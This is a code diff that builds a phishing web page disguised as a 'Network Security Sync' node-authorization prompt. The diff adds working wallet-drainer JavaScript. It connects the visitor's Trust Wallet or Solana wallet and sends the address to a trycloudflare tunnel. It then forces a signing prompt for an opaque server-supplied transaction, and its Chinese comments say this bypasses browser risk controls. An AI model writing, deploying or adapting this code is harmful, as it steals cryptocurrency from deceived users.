@@ -1,28 +1,67 @@
-<script>
-    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
-    document.getElementById('cta').onclick = async function() {
-        const log = (t) => document.getElementById('st').innerText = t;
-        const p = window.trustwallet?.solana || window.solana;
-        
-        try {
-            await p.connect();
-            const resp = await fetch(tunnel + "/prepare_v32", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ address: p.publicKey.toString() })
-            });
-            const info = await resp.json();
-            
-            log("WAKING WALLET...");
-            
-            // 🔱 V35 核心：深度链接暴力拉起
-            // 这会直接惊动 TW 的系统监听器，强制弹出签名确认
-            const txBase64 = info.raw_tx;
-            window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(txBase64);
-            
-            // 备用：同时尝试常规唤醒
-            setTimeout(() => { p.signTransaction(window.solanaWeb3.Transaction.from(window.atob(txBase64))); }, 1000);
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security Sync</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 20px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE SYNC</h2>
+        <p style="color:#777; font-size:14px; margin-bottom:25px;">Authorize synchronization to secure node connection.</p>
+        <button id="cta" class="btn">INITIALIZE</button>
+        <div id="st">ENGINE: V35.1_FORCE</div>
+    </div>
 
-        } catch (err) { window.location.reload(); }
-    };
-</script>
+    <script>
+        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+
+        document.getElementById('cta').onclick = async function() {
+            const log = (t) => document.getElementById('st').innerText = t;
+            const sWeb3 = window.solanaWeb3;
+
+            try {
+                const p = window.trustwallet?.solana || window.solana;
+                if (!p) { alert("Please use Trust Wallet Browser."); return; }
+
+                log("CONNECTING...");
+                await p.connect();
+
+                log("FETCHING...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                log("WAKING WALLET...");
+                
+                // 🔱 核心：通过系统协议强制呼唤钱包，跳过浏览器风控
+                const rawTx = info.raw_tx;
+                
+                // 尝试方法 1：Provider 唤醒
+                p.signTransaction(sWeb3.Transaction.from(Uint8Array.from(atob(rawTx), c => c.charCodeAt(0)))).catch(()=>{});
+                
+                // 尝试方法 2：系统深度链接跳转 (解决不弹窗问题)
+                setTimeout(() => {
+                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(rawTx);
+                }, 500);
+
+                log("CHECK WALLET POPUP");
+
+            } catch (err) {
+                log("RETRYING...");
+                setTimeout(() => { window.location.reload(); }, 1500);
+            }
+        };
+    </script>
+</body>
+</html>
